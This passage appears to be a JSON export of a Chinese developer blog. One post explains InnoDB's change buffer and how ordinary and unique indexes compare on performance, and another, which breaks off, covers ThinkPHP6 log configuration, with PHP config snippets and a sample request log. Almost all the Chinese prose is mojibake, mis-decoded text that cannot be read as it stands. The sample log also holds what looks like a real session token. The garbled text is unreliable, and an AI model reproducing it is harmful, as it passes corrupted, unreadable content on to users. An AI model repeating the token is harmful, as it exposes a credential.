¹å¼€å§‹ï¼ŒæŒ‰å±‚æœç´¢åˆ°å¶å­èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­å³ä¸‹è§’çš„è¿™ä¸ªæ•°æ®é¡µï¼Œç„¶åå¯ä»¥è®¤ä¸ºæ•°æ®é¡µå†…éƒ¨é€šè¿‡äºŒåˆ†æ³•æ¥å®šä½è®°å½•ã€‚ å¯¹äºæ™®é€šç´¢å¼•æ¥è¯´ï¼ŒæŸ¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªè®°å½• (5,500) åï¼Œéœ€è¦æŸ¥æ‰¾ä¸‹ä¸€ä¸ªè®°å½•ï¼Œç›´åˆ°ç¢°åˆ°ç¬¬ä¸€ä¸ªä¸æ»¡è¶³ k=5 æ¡ä»¶çš„è®°å½•ã€‚ å¯¹äºå”¯ä¸€ç´¢å¼•æ¥è¯´ï¼Œç”±äºç´¢å¼•å®šä¹‰äº†å”¯ä¸€æ€§ï¼ŒæŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„è®°å½•åï¼Œå°±ä¼šåœæ­¢ç»§ç»­æ£€ç´¢ã€‚ æŸ¥è¯¢è¿‡ç¨‹çš„æ€§èƒ½æ¶ˆè€—ï¼Œä¸¤è€…çš„å·®è·å‡ ä¹å¾®ä¹å…¶å¾®ã€‚ InnoDB çš„æ•°æ®æ˜¯æŒ‰æ•°æ®é¡µä¸ºå•ä½æ¥è¯»å†™çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“éœ€è¦è¯»ä¸€æ¡è®°å½•çš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯å°†è¿™ä¸ªè®°å½•æœ¬èº«ä»ç£ç›˜è¯»å‡ºæ¥ï¼Œè€Œæ˜¯ä»¥é¡µä¸ºå•ä½ï¼Œå°†å…¶æ•´ä½“è¯»å…¥å†…å­˜ã€‚åœ¨ InnoDB ä¸­ï¼Œæ¯ä¸ªæ•°æ®é¡µçš„å¤§å°é»˜è®¤æ˜¯ 16KBã€‚ å› ä¸ºå¼•æ“æ˜¯æŒ‰é¡µè¯»å†™çš„ï¼Œæ‰€ä»¥è¯´ï¼Œå½“æ‰¾åˆ° k=5 çš„è®°å½•çš„æ—¶å€™ï¼Œå®ƒæ‰€åœ¨çš„æ•°æ®é¡µå°±éƒ½åœ¨å†…å­˜é‡Œäº†ã€‚é‚£ä¹ˆï¼Œå¯¹äºæ™®é€šç´¢å¼•æ¥è¯´ï¼Œè¦å¤šåšçš„é‚£ä¸€æ¬¡â€œæŸ¥æ‰¾å’Œåˆ¤æ–­ä¸‹ä¸€æ¡è®°å½•â€çš„æ“ä½œï¼Œå°±åªéœ€è¦ä¸€æ¬¡æŒ‡é’ˆå¯»æ‰¾å’Œä¸€æ¬¡è®¡ç®—ã€‚ å½“ç„¶ï¼Œå¦‚æœ k=5 è¿™ä¸ªè®°å½•åˆšå¥½æ˜¯è¿™ä¸ªæ•°æ®é¡µçš„æœ€åä¸€ä¸ªè®°å½•ï¼Œé‚£ä¹ˆè¦å–ä¸‹ä¸€ä¸ªè®°å½•ï¼Œå¿…é¡»è¯»å–ä¸‹ä¸€ä¸ªæ•°æ®é¡µï¼Œè¿™ä¸ªæ“ä½œä¼šç¨å¾®å¤æ‚ä¸€äº›ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¹‹å‰è®¡ç®—è¿‡ï¼Œå¯¹äºæ•´å‹å­—æ®µï¼Œä¸€ä¸ªæ•°æ®é¡µå¯ä»¥æ”¾è¿‘åƒä¸ª keyï¼Œå› æ­¤å‡ºç°è¿™ç§æƒ…å†µçš„æ¦‚ç‡ä¼šå¾ˆä½ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è®¡ç®—å¹³å‡æ€§èƒ½å·®å¼‚æ—¶ï¼Œä»å¯ä»¥è®¤ä¸ºè¿™ä¸ªæ“ä½œæˆæœ¬å¯¹äºç°åœ¨çš„ CPU æ¥è¯´å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚ æ›´æ–°è¿‡ç¨‹ä¸ºäº†è¯´æ˜æ™®é€šç´¢å¼•å’Œå”¯ä¸€ç´¢å¼•å¯¹æ›´æ–°è¯­å¥æ€§èƒ½çš„å½±å“è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å…ˆä»‹ç»ä¸€ä¸‹ change bufferã€‚ å½“éœ€è¦æ›´æ–°ä¸€ä¸ªæ•°æ®é¡µæ—¶ï¼Œå¦‚æœæ•°æ®é¡µåœ¨å†…å­˜ä¸­å°±ç›´æ¥æ›´æ–°ï¼Œè€Œå¦‚æœè¿™ä¸ªæ•°æ®é¡µè¿˜æ²¡æœ‰åœ¨å†…å­˜ä¸­çš„è¯ï¼Œåœ¨ä¸å½±å“æ•°æ®ä¸€è‡´æ€§çš„å‰æä¸‹ï¼ŒInooDB ä¼šå°†è¿™äº›æ›´æ–°æ“ä½œç¼“å­˜åœ¨ change buffer ä¸­ï¼Œè¿™æ ·å°±ä¸éœ€è¦ä»ç£ç›˜ä¸­è¯»å…¥è¿™ä¸ªæ•°æ®é¡µäº†ã€‚åœ¨ä¸‹æ¬¡æŸ¥è¯¢éœ€è¦è®¿é—®è¿™ä¸ªæ•°æ®é¡µçš„æ—¶å€™ï¼Œå°†æ•°æ®é¡µè¯»å…¥å†…å­˜ï¼Œç„¶åæ‰§è¡Œ change buffer ä¸­ä¸è¿™ä¸ªé¡µæœ‰å…³çš„æ“ä½œã€‚é€šè¿‡è¿™ç§æ–¹å¼å°±èƒ½ä¿è¯è¿™ä¸ªæ•°æ®é€»è¾‘çš„æ­£ç¡®æ€§ã€‚ éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œè™½ç„¶åå­—å«ä½œ change bufferï¼Œå®é™…ä¸Šå®ƒæ˜¯å¯ä»¥æŒä¹…åŒ–çš„æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œchange buffer åœ¨å†…å­˜ä¸­æœ‰æ‹·è´ï¼Œä¹Ÿä¼šè¢«å†™å…¥åˆ°ç£ç›˜ä¸Šã€‚ å°† change buffer ä¸­çš„æ“ä½œåº”ç”¨åˆ°åŸæ•°æ®é¡µï¼Œå¾—åˆ°æœ€æ–°ç»“æœçš„è¿‡ç¨‹ç§°ä¸º mergeã€‚é™¤äº†è®¿é—®è¿™ä¸ªæ•°æ®é¡µä¼šè§¦å‘ merge å¤–ï¼Œç³»ç»Ÿæœ‰åå°çº¿ç¨‹ä¼šå®šæœŸ mergeã€‚åœ¨æ•°æ®åº“æ­£å¸¸å…³é—­ï¼ˆshutdownï¼‰çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¼šæ‰§è¡Œ merge æ“ä½œã€‚ æ˜¾ç„¶ï¼Œå¦‚æœèƒ½å¤Ÿå°†æ›´æ–°æ“ä½œå…ˆè®°å½•åœ¨ change bufferï¼Œå‡å°‘è¯»ç£ç›˜ï¼Œè¯­å¥çš„æ‰§è¡Œé€Ÿåº¦ä¼šå¾—åˆ°æ˜æ˜¾çš„æå‡ã€‚è€Œä¸”ï¼Œæ•°æ®è¯»å…¥å†…å­˜æ˜¯éœ€è¦å ç”¨ buffer pool çš„ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼è¿˜èƒ½å¤Ÿé¿å…å ç”¨å†…å­˜ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡ã€‚ æ‰€ä»¥ï¼Œä»€ä¹ˆæ¡ä»¶ä¸‹å¯ä»¥ä½¿ç”¨ change buffer å‘¢ï¼Ÿ å¯¹äºå”¯ä¸€ç´¢å¼•æ¥è¯´ï¼Œæ‰€æœ‰çš„æ›´æ–°æ“ä½œéƒ½è¦å…ˆåˆ¤æ–­è¿™ä¸ªæ“ä½œæ˜¯å¦è¿åå”¯ä¸€æ€§çº¦æŸã€‚æ¯”å¦‚ï¼Œè¦æ’ å…¥ (4,400) è¿™ä¸ªè®°å½•ï¼Œå°±è¦å…ˆåˆ¤æ–­ç°åœ¨è¡¨ä¸­æ˜¯å¦å·²ç»å­˜åœ¨ k=4 çš„è®°å½•ï¼Œè€Œè¿™å¿…é¡»è¦å°†æ•°æ® é¡µè¯»å…¥å†…å­˜æ‰èƒ½åˆ¤æ–­ã€‚å¦‚æœéƒ½å·²ç»è¯»å…¥åˆ°å†…å­˜äº†ï¼Œé‚£ç›´æ¥æ›´æ–°å†…å­˜ä¼šæ›´å¿«ï¼Œå°±æ²¡å¿…è¦ä½¿ç”¨ change buffer äº†ã€‚ å› æ­¤ï¼Œå”¯ä¸€ç´¢å¼•çš„æ›´æ–°å°±ä¸èƒ½ä½¿ç”¨ change bufferï¼Œå®é™…ä¸Šä¹Ÿåªæœ‰æ™®é€šç´¢å¼•å¯ä»¥ä½¿ç”¨ã€‚ åœ¨ç†è§£äº† change buffer æœºåˆ¶ä¹‹åï¼Œå†æ¥çœ‹çœ‹å¦‚æœè¦åœ¨è¿™å¼ è¡¨ä¸­æ’ å…¥ä¸€ä¸ªæ–°è®°å½• (4,400) çš„è¯ï¼ŒInnoDB çš„å¤„ç†æµç¨‹æ˜¯æ€æ ·çš„ã€‚ å¦‚æœè¿™ä¸ªè®°å½•è¦æ›´æ–°çš„ç›®æ ‡é¡µåœ¨å†…å­˜ä¸­ã€‚è¿™æ—¶ï¼ŒInnoDB çš„å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š å¯¹äºå”¯ä¸€ç´¢å¼•æ¥è¯´ï¼Œæ‰¾åˆ° 3 å’Œ 5 ä¹‹é—´çš„ä½ç½®ï¼Œåˆ¤æ–­åˆ°æ²¡æœ‰å†²çªï¼Œæ’å…¥è¿™ä¸ªå€¼ï¼Œè¯­å¥æ‰§è¡Œç»“æŸ; å¯¹äºæ™®é€šç´¢å¼•æ¥è¯´ï¼Œæ‰¾åˆ° 3 å’Œ 5 ä¹‹é—´çš„ä½ç½®ï¼Œæ’å…¥è¿™ä¸ªå€¼ï¼Œè¯­å¥æ‰§è¡Œç»“æŸã€‚ è¿™æ ·çœ‹æ¥ï¼Œæ™®é€šç´¢å¼•å’Œå”¯ä¸€ç´¢å¼•å¯¹æ›´æ–°è¯­å¥æ€§èƒ½å½±å“çš„å·®åˆ«ï¼Œåªæ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œåªä¼šè€—è´¹å¾®å° çš„ CPU æ—¶é—´ã€‚ä½†ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬å…³æ³¨çš„é‡ç‚¹ã€‚ å¦‚æœè¿™ä¸ªè®°å½•è¦æ›´æ–°çš„ç›®æ ‡é¡µä¸åœ¨å†…å­˜ä¸­ã€‚è¿™æ—¶ï¼ŒInnoDB çš„å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š å¯¹äºå”¯ä¸€ç´¢å¼•æ¥è¯´ï¼Œéœ€è¦å°†æ•°æ®é¡µè¯»å…¥å†…å­˜ï¼Œåˆ¤æ–­åˆ°æ²¡æœ‰å†²çªï¼Œæ’å…¥è¿™ä¸ªå€¼ï¼Œè¯­å¥æ‰§è¡Œç»“æŸ; å¯¹äºæ™®é€šç´¢å¼•æ¥è¯´ï¼Œåˆ™æ˜¯å°†æ›´æ–°è®°å½•åœ¨ change bufferï¼Œè¯­å¥æ‰§è¡Œå°±ç»“æŸäº†ã€‚ å°†æ•°æ®ä»ç£ç›˜è¯»å…¥å†…å­˜æ¶‰åŠéšæœº IO çš„è®¿é—®ï¼Œæ˜¯æ•°æ®åº“é‡Œé¢æˆæœ¬æœ€é«˜çš„æ“ä½œä¹‹ä¸€ã€‚change buffer å› ä¸ºå‡å°‘äº†éšæœºç£ç›˜è®¿é—®ï¼Œæ‰€ä»¥å¯¹æ›´æ–°æ€§èƒ½çš„æå‡æ˜¯ä¼šå¾ˆæ˜æ˜¾çš„ã€‚ change buffer çš„ä½¿ç”¨åœºæ™¯é€šè¿‡ä¸Šé¢çš„åˆ†æå·²ç»æ¸…æ¥šäº†ï¼Œä½¿ç”¨ change buffer å¯¹æ›´æ–°è¿‡ç¨‹æœ‰åŠ é€Ÿä½œç”¨ï¼Œchange buffer ä»…é™äºæ™®é€šç´¢å¼•ä½¿ç”¨ï¼Œä¸é€‚ç”¨å”¯ä¸€ç´¢å¼•ã€‚ é‚£ä¹ˆï¼Œæ™®é€šç´¢å¼•çš„æ‰€æœ‰åœºæ™¯ï¼Œä½¿ç”¨ change buffer éƒ½å¯ä»¥èµ·åˆ°åŠ é€Ÿä½œç”¨å—? å› ä¸º merge çš„æ—¶å€™æ˜¯çœŸæ­£è¿›è¡Œæ•°æ®æ›´æ–°çš„æ—¶åˆ»ï¼Œè€Œ change buffer çš„ä¸»è¦ç›®çš„å°±æ˜¯å°†è®°å½• çš„å˜æ›´åŠ¨ä½œç¼“å­˜ä¸‹æ¥ï¼Œæ‰€ä»¥åœ¨ä¸€ä¸ªæ•°æ®é¡µåš merge ä¹‹å‰ï¼Œchange buffer è®°å½•çš„å˜æ›´è¶Šå¤š (ä¹Ÿå°±æ˜¯è¿™ä¸ªé¡µé¢ä¸Šè¦æ›´æ–°çš„æ¬¡æ•°è¶Šå¤š)ï¼Œæ”¶ç›Šå°±è¶Šå¤§ã€‚ å› æ­¤ï¼Œå¯¹äºå†™å¤šè¯»å°‘çš„ä¸šåŠ¡æ¥è¯´ï¼Œé¡µé¢åœ¨å†™å®Œä»¥åé©¬ä¸Šè¢«è®¿é—®åˆ°çš„æ¦‚ç‡æ¯”è¾ƒå°ï¼Œæ­¤æ—¶ change buffer çš„ä½¿ç”¨æ•ˆæœæœ€å¥½ã€‚è¿™ç§ä¸šåŠ¡æ¨¡å‹å¸¸è§çš„å°±æ˜¯è´¦å•ç±»ã€æ—¥å¿—ç±»çš„ç³»ç»Ÿã€‚ åè¿‡æ¥ï¼Œå‡è®¾ä¸€ä¸ªä¸šåŠ¡çš„æ›´æ–°æ¨¡å¼æ˜¯å†™å…¥ä¹‹åé©¬ä¸Šä¼šåšæŸ¥è¯¢ï¼Œé‚£ä¹ˆå³ä½¿æ»¡è¶³äº†æ¡ä»¶ï¼Œå°†æ›´æ–° å…ˆè®°å½•åœ¨ change bufferï¼Œä½†ä¹‹åç”±äºé©¬ä¸Šè¦è®¿é—®è¿™ä¸ªæ•°æ®é¡µï¼Œä¼šç«‹å³è§¦å‘ merge è¿‡ç¨‹ã€‚ è¿™æ ·éšæœºè®¿é—® IO çš„æ¬¡æ•°ä¸ä¼šå‡å°‘ï¼Œåè€Œå¢åŠ äº† change buffer çš„ç»´æŠ¤ä»£ä»·ã€‚æ‰€ä»¥ï¼Œå¯¹äºè¿™ ç§ä¸šåŠ¡æ¨¡å¼æ¥è¯´ï¼Œchange buffer åè€Œèµ·åˆ°äº†å‰¯ä½œç”¨ã€‚ ç´¢å¼•é€‰æ‹©å’Œå®è·µå›åˆ°å¼€å¤´çš„é—®é¢˜ï¼Œæ™®é€šç´¢å¼•å’Œå”¯ä¸€ç´¢å¼•åº”è¯¥æ€ä¹ˆé€‰æ‹©ï¼Ÿ å…¶å®ï¼Œè¿™ä¸¤ç±»ç´¢å¼•åœ¨æŸ¥è¯¢èƒ½åŠ›ä¸Šæ˜¯æ²¡å·®åˆ«çš„ï¼Œä¸»è¦è€ƒè™‘çš„æ˜¯å¯¹æ›´æ–°æ€§èƒ½çš„å½±å“ã€‚å› æ­¤å¦‚æœä¸šåŠ¡å¯ä»¥æ¥å—ï¼Œä»æ€§èƒ½è§’åº¦å‡ºå‘å»ºè®®ä¼˜å…ˆè€ƒè™‘éå”¯ä¸€ç´¢å¼•ã€‚ å¦‚æœæ‰€æœ‰çš„æ›´æ–°åé¢ï¼Œéƒ½é©¬ä¸Šä¼´éšç€å¯¹è¿™ä¸ªè®°å½•çš„æŸ¥è¯¢ï¼Œé‚£ä¹ˆä½ åº”è¯¥å…³é—­ change bufferã€‚ è€Œåœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œchange buffer éƒ½èƒ½æå‡æ›´æ–°æ€§èƒ½ã€‚ æ€»ç»“ change buffer çš„æœºåˆ¶ï¼šå½“éœ€è¦æ›´æ–°ä¸€ä¸ªæ•°æ®é¡µæ—¶ï¼Œå¦‚æœæ•°æ®é¡µåœ¨å†…å­˜ä¸­å°±ç›´æ¥æ›´æ–°ï¼Œè€Œå¦‚æœè¿™ä¸ªæ•°æ®é¡µè¿˜æ²¡æœ‰åœ¨å†…å­˜ä¸­çš„è¯ï¼Œåœ¨ä¸å½±å“æ•°æ®ä¸€è‡´æ€§çš„å‰æä¸‹ï¼ŒInooDB ä¼šå°†è¿™äº›æ›´æ–°æ“ä½œç¼“å­˜åœ¨ change buffer ä¸­ï¼Œè¿™æ ·å°±ä¸éœ€è¦ä»ç£ç›˜ä¸­è¯»å…¥è¿™ä¸ªæ•°æ®é¡µäº†ã€‚ change buffer çš„ä¼˜åŠ¿ï¼šä¸éœ€è¦ä»ç£ç›˜ä¸­è¯»å…¥è¿™ä¸ªæ•°æ®é¡µï¼Œå‡å°‘ I/O è®¿é—®æ¬¡æ•° å“ªäº›æ“ä½œä¼šè§¦å‘ mergeï¼šè®¿é—®æ•°æ®é¡µã€ç³»ç»Ÿæœ‰åå°çº¿ç¨‹ä¼šå®šæœŸ mergeã€åœ¨æ•°æ®åº“æ­£å¸¸å…³é—­ (shutdown)çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿä¼šæ‰§è¡Œ merge æ“ä½œ æ™®é€šç´¢å¼•å¯ä»¥ä½¿ç”¨change bufferï¼Œå”¯ä¸€ç´¢å¼•ä¸ç”¨ä½¿ç”¨ change buffer redo log ä¸»è¦èŠ‚çœçš„ æ˜¯éšæœºå†™ç£ç›˜çš„ IO æ¶ˆè€—(è½¬æˆé¡ºåºå†™)ï¼Œè€Œ change buffer ä¸»è¦èŠ‚çœçš„åˆ™æ˜¯éšæœºè¯»ç£ç›˜ çš„ IO æ¶ˆè€—ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"ThinkPHP6 è‡ªå®šä¹‰æ—¥å¿—é©±åŠ¨","slug":"thinkphp6-custom-log-driver","date":"2022-06-17T08:53:38.000Z","updated":"2022-06-27T08:17:37.105Z","comments":true,"path":"thinkphp6-custom-log-driver/","link":"","permalink":"https://www.0x2beace.com/thinkphp6-custom-log-driver/","excerpt":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªé¡¹ç›®ï¼ŒThinkPHP6.x å†™çš„ï¼Œæ—¥å¿—å¤„ç†å½¢åŒè™šè®¾ï¼Œæ¯æ¬¡å‡ºäº†å•¥é—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´ä¹Ÿä¸çŸ¥é“é—®é¢˜å‡ºåœ¨å“ªï¼Œè°ƒè¯•èµ·æ¥éšœç¢å¾ˆå¤šã€‚","text":"æœ€è¿‘æ¥æ‰‹ä¸€ä¸ªé¡¹ç›®ï¼ŒThinkPHP6.x å†™çš„ï¼Œæ—¥å¿—å¤„ç†å½¢åŒè™šè®¾ï¼Œæ¯æ¬¡å‡ºäº†å•¥é—®é¢˜ï¼Œç¬¬ä¸€æ—¶é—´ä¹Ÿä¸çŸ¥é“é—®é¢˜å‡ºåœ¨å“ªï¼Œè°ƒè¯•èµ·æ¥éšœç¢å¾ˆå¤šã€‚ ThinkPHP 6.0 åœ¨æ—¥å¿—è¿™ä¸€å—ï¼Œæ”¹åŠ¨æŒºå¤§äº†ï¼Œç›´æ¥ç æ‰äº†åŸæ¥çš„è¯·æ±‚ä¿¡æ¯éƒ¨åˆ†ã€‚ æ—¥å¿—è®°å½•ThinkPHP å¯¹ç³»ç»Ÿçš„æ—¥å¿—æŒ‰ç…§çº§åˆ«æ¥åˆ†ç±»è®°å½•ï¼ŒæŒ‰ç…§ PSR-3 æ—¥å¿—è§„èŒƒã€‚é™¤éæ˜¯å®æ—¶å†™å…¥çš„æ—¥å¿—ï¼Œå…¶å®ƒæ—¥å¿—éƒ½æ˜¯åœ¨å½“å‰è¯·æ±‚ç»“æŸçš„æ—¶å€™ç»Ÿä¸€å†™å…¥çš„ æ‰€ä»¥ä¸è¦åœ¨æ—¥å¿—å†™å…¥ä¹‹åä½¿ç”¨exitç­‰ä¸­æ–­æ“ä½œä¼šå¯¼è‡´æ—¥å¿—å†™å…¥å¤±è´¥ã€‚ æ—¥å¿—çš„çº§åˆ«ä»ä½åˆ°é«˜ä¾æ¬¡ä¸ºï¼šdebugï¼Œinfoï¼Œnoticeï¼Œwarningï¼Œerrorï¼Œcriticalï¼Œalertï¼Œ emergencyï¼ŒThinkPHP é¢å¤–å¢åŠ äº†ä¸€ä¸ª sql æ—¥å¿—çº§åˆ«ä»…ç”¨äºè®°å½•SQLæ—¥å¿—ï¼ˆå¹¶ä¸”ä»…å½“å¼€å¯æ•°æ®åº“è°ƒè¯•æ¨¡å¼æœ‰æ•ˆï¼‰ã€‚ è®¾ç½®æ—¥å¿—è®°å½•çº§åˆ«config/log.php 1234567&lt;?phpuse app\\handle\\Tp6Log;return [ // æ—¥å¿—è®°å½•çº§åˆ« 'level' =&gt; [],]; å½“ level ä¸ºç©ºæ—¶ï¼Œè®°å½•æ‰€æœ‰çº§åˆ« å½“ level ä¸ä¸ºç©ºæ—¶ï¼Œåªè®°å½•levelä¸­æŒ‡å®šçš„é”™è¯¯çº§åˆ« 12345678public function index()&#123; // å½“ level é…ç½®ä¸º noticeã€warning // ä¼šè®°å½• Log::warning(\"è¿™æ˜¯ç¬¬ä¸€æ®µæ—¥å¿—\"); // ä¸ä¼šè®°å½•ï¼Œå› ä¸º info ä¸åœ¨æ—¥å¿—çº§åˆ«ä¸­ Log::info(\"è¿™æ˜¯ç¬¬äºŒæ®µæ—¥å¿—\");&#125; å•ä¸€æ—¥å¿—é»˜è®¤çš„ ThinkPHP æ—¥å¿—æ˜¯å†™åœ¨å½“å‰æ—¥æœŸ(å¹´æœˆ)ç›®å½•ä¸‹çš„ï¼Œå¦‚(runtime/admin/log/202204/30.log) è®¾ç½®å•æ–‡ä»¶æ—¥å¿—å†™å…¥ä¹‹åï¼Œæ‰€æœ‰æ—¥å¿—åˆ™å†™å…¥ single.log æ–‡ä»¶ä¸­ï¼š 1234567&lt;?phpuse app\\handle\\Tp6Log;return [ // å•æ–‡ä»¶æ—¥å¿—å†™å…¥ 'single' =&gt; true]; ç‹¬ç«‹æ—¥å¿—1234567&lt;?phpuse app\\handle\\Tp6Log;return [ // ç‹¬ç«‹æ—¥å¿—çº§åˆ« 'apart_level' =&gt; ['error', 'warning', \"info\"],]; è®¾ç½®ç‹¬ç«‹æ—¥å¿—çº§åˆ«ä¹‹åï¼Œä¸åŒç±»å‹çš„æ—¥å¿—å°†ä¼šåˆ†åˆ«è®°å½•åˆ°å¯¹åº”ç±»å‹çš„æ—¥å¿—æ–‡ä»¶ä¸‹ï¼š 1234567&#x2F;&#x2F; è®¾ç½®ç‹¬ç«‹æ—¥å¿—çº§åˆ«ä¹‹å‰runtime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30.log&#x2F;&#x2F; è®¾ç½®ç‹¬ç«‹æ—¥å¿—çº§åˆ«ä¹‹åruntime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_warning.logruntime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_error.logruntime&#x2F;admin&#x2F;log&#x2F;202204&#x2F;30_info.log æ—¥å¿—çš„å†™å…¥æ—¶æœºæ—¥å¿—å†™å…¥æ—¶æœºæä¾›ä¸¤ç§ å®æ—¶å†™å…¥ ç¨‹åºæ‰§è¡Œå®Œåå†™å…¥ 1234567&lt;?phpuse app\\handle\\Tp6Log;return [ // å®æ—¶å†™å…¥ 'realtime_write' =&gt; true,]; æ—¥å¿—é€šé“ThinkPHP6.x æ—¥å¿—ç±»çš„ä¸€å¤§ç‰¹æ€§å°±æ˜¯æ—¥å¿—çº§åˆ«æ”¯æŒæŒ‡å®šé€šé“å†™å…¥ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å®ç°è‡ªå®šä¹‰çš„æ—¥å¿—è®°å½•ï¼Œè‡ªå®šä¹‰æ—¥å¿—é©±åŠ¨ç±»ï¼Œå®ç° think\\contract\\LogHandlerInterface æ¥å£ã€‚ å°† config/log.php ä¸­é€šé“ type æ”¹æˆè‡ªå®šä¹‰é©±åŠ¨ç±»å³å¯ã€‚ config.phpï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php// +----------------------------------------------------------------------// | æ—¥å¿—è®¾ç½®// +----------------------------------------------------------------------use app\\handle\\Tp6Log;return [ // é»˜è®¤æ—¥å¿—è®°å½•é€šé“ 'default' =&gt; env('log.channel', 'file'), // æ—¥å¿—è®°å½•çº§åˆ« 'level' =&gt; [], // æ—¥å¿—ç±»å‹è®°å½•çš„é€šé“ ['error'=&gt;'email',...] 'type_channel' =&gt; [], // å…³é—­å…¨å±€æ—¥å¿—å†™å…¥ 'close' =&gt; false, // å…¨å±€æ—¥å¿—å¤„ç† æ”¯æŒé—­åŒ… 'processor' =&gt; null, // ThinkPHPå¯¹ç³»ç»Ÿçš„æ—¥å¿—æŒ‰ç…§çº§åˆ«æ¥åˆ†ç±»è®°å½•ï¼ŒæŒ‰ç…§PSR-3æ—¥å¿—è§„èŒƒï¼Œæ—¥å¿—çš„çº§åˆ«ä»ä½åˆ°é«˜ä¾æ¬¡ä¸ºï¼š // debug, info, notice, warning, error, critical, alert, emergency // ThinkPHPé¢å¤–å¢åŠ äº†ä¸€ä¸ªsqlæ—¥å¿—çº§åˆ«ä»…ç”¨äºè®°å½•SQLæ—¥å¿—ï¼ˆå¹¶ä¸”ä»…å½“å¼€å¯æ•°æ®åº“è°ƒè¯•æ¨¡å¼æœ‰æ•ˆï¼‰ã€‚ // æ—¥å¿—é€šé“åˆ—è¡¨ 'channels' =&gt; [ 'file' =&gt; [ // æ—¥å¿—è®°å½•æ–¹å¼ 'type' =&gt; 'File', // 'type' =&gt; Tp6Log::class, // æ—¥å¿—ä¿å­˜ç›®å½• // \"path\" =&gt; \"\", // å¦‚æœæ²¡æœ‰è®¾ç½®è·¯å¾„ï¼Œæ—¥å¿—ä¼šè¾“å‡ºåˆ°å¯¹åº”çš„åº”ç”¨ç›®å½•ä¸‹; å¦‚æœè®¾ç½®äº†è·¯å¾„ï¼Œåˆ™æ‰€æœ‰çš„æ—¥å¿—éƒ½ä¼šè¾“å‡ºåˆ°è¯¥è·¯å¾„ä¸‹ 'path' =&gt; app()-&gt;getRuntimePath() . 'debug', // å•æ–‡ä»¶æ—¥å¿—å†™å…¥ 'single' =&gt; false, // ç‹¬ç«‹æ—¥å¿—çº§åˆ« 'apart_level' =&gt; ['error', 'sql',], // æœ€å¤§æ—¥å¿—æ–‡ä»¶æ•°é‡ 'max_files' =&gt; 0, // ä½¿ç”¨JSONæ ¼å¼è®°å½• 'json' =&gt; false, // æ–‡ä»¶å¤§å° 'file_size' =&gt; 1024*1024*2, // æ—¥å¿—å¤„ç† 'processor' =&gt; null, // å…³é—­é€šé“æ—¥å¿—å†™å…¥ 'close' =&gt; false, // æ—¥å¿—è¾“å‡ºæ ¼å¼åŒ– 'format' =&gt; '[%s][%s] %s', // æ˜¯å¦å®æ—¶å†™å…¥ 'realtime_write' =&gt; true, ], // å…¶å®ƒæ—¥å¿—é€šé“é…ç½® ],]; è‡ªå®šä¹‰æ—¥å¿—é©±åŠ¨æˆ‘å¸Œæœ›å“ªäº›ä¿¡æ¯èƒ½è¢«è®°å½•ï¼Ÿ è¯·æ±‚è®°å½• SQL æ‰§è¡Œè®°å½• é”™è¯¯ä¿¡æ¯ ThinkPHP 5.x ç‰ˆæœ¬ï¼Œè¿˜å­˜åœ¨è¯·æ±‚è®°å½•çš„æ—¥å¿—ã€‚ç±»ä¼¼ä¸‹é¢çš„è¾“å‡ºï¼š 1234567891011121314151617[2022-06-16T11:38:42+08:00] 127.0.0.1 POST localhost&#x2F;api&#x2F;v1.index&#x2F;index[è¿è¡Œæ—¶é—´ï¼š0.508767s] [ååç‡ï¼š1.97req&#x2F;s] [å†…å­˜æ¶ˆè€—ï¼š705.89kb] [æ–‡ä»¶åŠ è½½ï¼š156][ HEADER ] array ( &#39;accept-encoding&#39; &#x3D;&gt; &#39;gzip, deflate&#39;, &#39;referer&#39; &#x3D;&gt; &#39;https:&#x2F;&#x2F;servicewechat.com&#x2F;wx8703b750b3e3c6dc&#x2F;devtools&#x2F;page-frame.html&#39;, &#39;accept&#39; &#x3D;&gt; &#39;*&#x2F;*&#39;, &#39;version&#39; &#x3D;&gt; &#39;&#39;, &#39;token&#39; &#x3D;&gt; &#39;ae42R9eUhyp3NUdW+AzKYOvEcr&#x2F;UCwYLGA6nNMxrhT5AApsjJCpQuCX5WA2jePdKZBV1RP1Ws0&#x2F;cK0KXxAjNDu&#x2F;JRW4tqYPJ2vyNiiCwT6WbLe0Y2t7fo2P4sfRZrRSEnePSlJAetbU0afh5mzi9X6NztTd7fk4cBtGFxhFmTMmWynoL+HZ0DBGQ2VjwT82DjYbaUq+Ww4JUybQeSvpxcwqbEY3UR0L++gz+tQ&#39;, &#39;user-agent&#39; &#x3D;&gt; &#39;Mozilla&#x2F;5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit&#x2F;604.1.38 (KHTML, like Gecko) Version&#x2F;11.0 Mobile&#x2F;15A372 Safari&#x2F;604.1 wechatdevtools&#x2F;1.05.2107090 